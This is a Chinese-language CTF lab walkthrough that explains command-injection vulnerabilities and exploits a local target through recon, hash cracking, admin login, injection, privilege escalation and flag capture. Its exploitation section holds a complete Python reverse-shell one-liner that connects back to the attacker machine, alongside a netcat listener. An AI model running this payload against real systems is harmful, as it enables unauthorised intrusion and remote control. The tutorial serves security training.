## 命令执行漏洞原理

上一节我们介绍了命令执行的基本概念，本节中我们来看看其产生的具体原因。

![](img/f1bb125b20465c96906ccc5e55ad775e_1.png)

![](img/f1bb125b20465c96906ccc5e55ad775e_3.png)

命令执行漏洞是这样产生的。当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。例如在PHP语言中，有`system()`、`exec()`、`shell_exec()`等函数。

当用户可以控制命令执行函数中的参数时，就可以注入恶意系统命令到正常的命令中，造成命令执行攻击。在调用这些函数执行系统命令时，如果没有对用户的输入进行严格的过滤，那么用户输入将作为系统命令参数拼接到命令行中，最终导致命令执行漏洞。

## 实验环境搭建

以下是本次实验的环境配置。

*   **攻击机**：Kali Linux，IP地址为`192.168.253.12`。
*   **靶机**：Linux系统，IP地址为`192.168.253.18`。

在CTF比赛中，我们的目标通常是获取靶机上的`flag`值。以此为目标，我们开始进行测试。

进行测试的第一步是信息探测。在之前的课程中，我们使用了许多命令行工具，如`nmap`和`dirb`。本节我们将使用更高级的图形化集成工具`Sparta`来进行探测。

`Sparta`是一个具有用户界面的工具，它可以调用多种命令行工具，并将输出结果整合到其集成框架中。下面我们使用该工具对靶机进行信息探测。

![](img/f1bb125b20465c96906ccc5e55ad775e_13.png)

![](img/f1bb125b20465c96906ccc5e55ad775e_15.png)

首先，回到Kali Linux，测试与靶机的连通性。

收到ICMP响应，证明网络连通。

![](img/f1bb125b20465c96906ccc5e55ad775e_17.png)

接下来，打开信息探测的集成工具`Sparta`。
```bash
sparta
```
工具打开后，将目标IP地址`192.168.253.18`添加到扫描范围中。工具会自动调用`Nmap`进行端口扫描，同时也会调用`Nikto`进行敏感文件扫描，并抓取靶机快照。

![](img/f1bb125b20465c96906ccc5e55ad775e_19.png)

扫描结果显示，靶机开放了`23`、`80`和`8080`端口。`80`和`8080`端口运行的都是HTTP服务，且版本信息显示使用了`Python 2.7.1`和`Django`框架。

![](img/f1bb125b20465c96906ccc5e55ad775e_21.png)

## 深入分析与漏洞挖掘

![](img/f1bb125b20465c96906ccc5e55ad775e_23.png)

在收集完基本信息后，我们需要对开放的服务进行深入分析。

我们首先针对`80`端口进行分析。在`Sparta`中选中`80`端口，右键选择在浏览器中打开，可以查看网站首页。同时，使用右键菜单中的`WhatWeb`扫描功能，可以进一步确认网站使用的技术栈，如`Python Django`框架。

![](img/f1bb125b20465c96906ccc5e55ad775e_25.png)

以下是使用`Sparta`集成的其他工具进行深度探测的步骤。

![](img/f1bb125b20465c96906ccc5e55ad775e_27.png)

![](img/f1bb125b20465c96906ccc5e55ad775e_29.png)

*   **使用Nikto扫描**：右键选择`Run Nikto`，工具会进行漏洞扫描，并提示可能存在的敏感目录，例如发现了`/dev`目录。
*   **使用Dirbuster扫描**：右键选择`Run Dirbuster`，进行目录暴力破解。在设置中，选择Kali自带的字典文件（如`/usr/share/dirb/wordlists/common.txt`），并将文件扩展名改为`.py`（因为目标使用Python）。开始扫描后，会发现诸如`/admin`这样的后台登录目录。

在扫描过程中，我们发现了敏感目录`/admin`和`/dev`。

*   访问`/admin`目录，发现是一个登录界面。
*   访问`/dev`目录，发现一个`Web Shell`链接，但点击后提示需要服务器认证。

## 获取认证凭据

![](img/f1bb125b20465c96906ccc5e55ad775e_31.png)

为了访问受保护的`Web Shell`，我们需要获取有效的用户名和密码。我们通过分析页面源代码来寻找线索。

![](img/f1bb125b20465c96906ccc5e55ad775e_33.png)

查看`/dev`目录页面的源代码，发现其中包含多段哈希值。我们将这些哈希值保存到本地文件`hash.txt`中。
```bash
cd /root/Desktop
gedit hash.txt
# 将页面中的哈希值复制保存到该文件中
```

接下来，使用在线哈希破解网站（如`https://crackstation.net/`）对这些哈希值进行破解。成功破解出两段明文：`bob`和`bob1234`。

## 登录后台与漏洞扫描

使用破解得到的用户名`bob`和密码`bob1234`，成功登录到`/admin`后台。

进入后台后，我们尝试寻找漏洞点。一种常见的误区是认为漏洞扫描器能发现所有漏洞。下面我们使用著名的漏洞扫描器`AWVS`对站点进行扫描。

![](img/f1bb125b20465c96906ccc5e55ad775e_35.png)

在`AWVS`中新建站点目标`http://192.168.253.18`，进行全扫描。扫描结果发现了一些低危信息泄露漏洞（如敏感目录`/dev`、`/admin`），但并未发现可直接获取权限的高危漏洞。

![](img/f1bb125b20465c96906ccc5e55ad775e_37.png)

![](img/f1bb125b20465c96906ccc5e55ad775e_39.png)

这提醒我们，扫描器可能无法扫描到需要认证后才能访问的后台页面中的漏洞。因此，手动测试至关重要。

![](img/f1bb125b20465c96906ccc5e55ad775e_41.png)

## 利用命令执行漏洞

![](img/f1bb125b20465c96906ccc5e55ad775e_43.png)

由于我们已经登录系统，获得了`Cookie`，现在可以访问之前需要认证的`/dev`目录下的`Web Shell`页面。

![](img/f1bb125b20465c96906ccc5e55ad775e_45.png)

![](img/f1bb125b20465c96906ccc5e55ad775e_47.png)

访问该`Web Shell`，页面提示可以执行一些受限制的`shell`命令。这是一个存在过滤机制的命令执行点。我们的目标是绕过过滤，让靶机向我们反弹一个`shell`。

![](img/f1bb125b20465c96906ccc5e55ad775e_49.png)

![](img/f1bb125b20465c96906ccc5e55ad775e_50.png)

![](img/f1bb125b20465c96906ccc5e55ad775e_52.png)

首先，在攻击机（Kali）上使用`netcat`监听一个端口（例如`4444`）。
```bash
nc -nlvp 4444
```

然后，在`Web Shell`的命令执行框中，尝试注入反弹`shell`的命令。假设攻击机IP为`192.168.253.12`，可以尝试使用以下`Python`代码进行反弹。
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.253.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
执行后，在攻击机的`nc`监听端口中成功收到了来自靶机的`shell`连接。

## 权限提升与获取Flag

获得初始`shell`后，我们通常不是`root`权限。使用`id`命令查看，确认当前是普通用户。

接下来进行权限提升。首先在系统中寻找敏感文件或配置。
```bash
find / -type f -perm -4000 2>/dev/null # 查找SUID文件
ls -la /home/ # 查看用户目录
```
在某个用户目录（如`/home/bob/.hidden_admin/`）下，发现一个可疑的可执行文件`custom_tool.app`。使用`strings`命令查看其内部的字符串。
```bash
strings /home/bob/.hidden_admin/custom_tool.app
```
在输出中，发现一段提示文字，暗示了`root`密码。提取并整理这段文字，获得密码。

使用`su`命令切换至`root`用户。
```bash
su root
# 输入破解得到的密码
```
输入密码后，成功提升为`root`权限。使用`id`命令确认，用户ID变为`0`。

![](img/f1bb125b20465c96906ccc5e55ad775e_54.png)

![](img/f1bb125b20465c96906ccc5e55ad775e_55.png)

最后，在`root`用户目录下寻找`flag`文件。
```bash
cd /root
ls
cat flag.txt
```
成功读取`flag`文件内容，完成挑战。

![](img/f1bb125b20465c96906ccc5e55ad775e_57.png)

## 总结

![](img/f1bb125b20465c96906ccc5e55ad775e_59.png)

本节课中我们一起学习了命令执行漏洞的完整利用流程。

1.  **信息收集**：使用`Sparta`等集成工具进行端口扫描、目录爆破和技术栈识别。
2.  **获取凭据**：通过分析页面源代码、破解哈希值等方式获得后台登录权限。
3.  **漏洞发现与利用**：在已认证的后台中找到存在过滤的命令执行点，并构造Payload实现反弹`shell`。
4.  **权限提升**：在目标系统内查找敏感信息（如SUID文件、隐藏目录中的可执行文件），通过分析其字符串或逻辑漏洞获取`root`密码。
5.  **获取Flag**：提升至`root`权限后，在标准位置（如`/root`目录）找到并读取`flag`文件。

![](img/f1bb125b20465c96906ccc5e55ad775e_61.png)

在真实的CTF比赛或安全评估中，命令执行漏洞往往伴随着各种过滤机制，需要选手灵活运用编码、拼接、利用环境变量等技巧进行绕过。
